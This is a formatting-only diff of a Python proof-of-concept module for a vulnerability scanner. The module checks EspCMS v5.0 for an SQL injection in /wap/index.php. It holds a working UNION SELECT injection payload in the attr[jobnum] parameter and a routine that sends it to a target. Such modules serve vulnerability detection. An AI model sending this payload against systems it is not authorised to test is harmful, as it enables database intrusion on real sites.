@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'EspCMS_0013' # 平台漏洞编号，留空
+    vuln_id = 'EspCMS_0013'  # 平台漏洞编号，留空
     name = '易思CMS v5.0 /wap/index.php SQL注入漏洞'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2013-06-25'  # 漏洞公布时间
     desc = '''
         EspCMS(易思CMS) v5.0 /wap/index.php，attr[jobnum]造成了注入。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'EspCMS(易思CMS)'  # 漏洞应用名称
     product_version = 'v5.0'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'e1e70f1a-89a2-4cca-b842-fd3de9cc87a7'
@@ -31,7 +33,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = ("/wap/index.php?ac=search&at=result&lng=cn&mid=3&tid=11&keyword=1&keyname="
                        "a.title&countnum=1&attr%5Bjobnum%5D=1%27%20and%201=2%20UNION%20SELECT%201,2,"
                        "3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,concat%28md5%283"
@@ -39,16 +41,17 @@ class Poc(ABPoc):
             verify_url = self.target + payload
             req = urllib2.Request(verify_url)
             content = urllib2.urlopen(req).read()
-            
+
             if "63e1f04640e83605c1d177544a5a0488" in content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
